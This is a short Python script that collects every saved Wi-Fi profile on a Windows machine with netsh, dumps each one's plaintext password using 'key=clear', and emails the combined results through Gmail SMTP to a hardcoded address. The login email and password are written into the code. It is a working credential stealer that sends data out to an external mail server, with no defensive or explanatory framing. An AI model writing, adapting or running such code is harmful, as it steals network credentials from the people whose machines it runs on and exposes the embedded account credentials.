#!/usr/bin/env python

import subprocess, smtplib, re

def send(email,password,message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,email,message)
	server.quit()

command = "netsh wlan show profile"
network = subprocess.check_output(command, shell=True)
networkNames_List = re.findall("(?:Profile\s*:\s)(.*)", network)
#print(networkNames_List)
result = ""
for networkName in networkNames_List:
	command1 = "netsh wlan show profile " + networkName + " key=clear"
	currentResult = subprocess.check_output(command1, shell=True)
	result = result + currentResult
	#print(result)
send("eqan.ahmad123@gmail.com", "6nov2001", result)
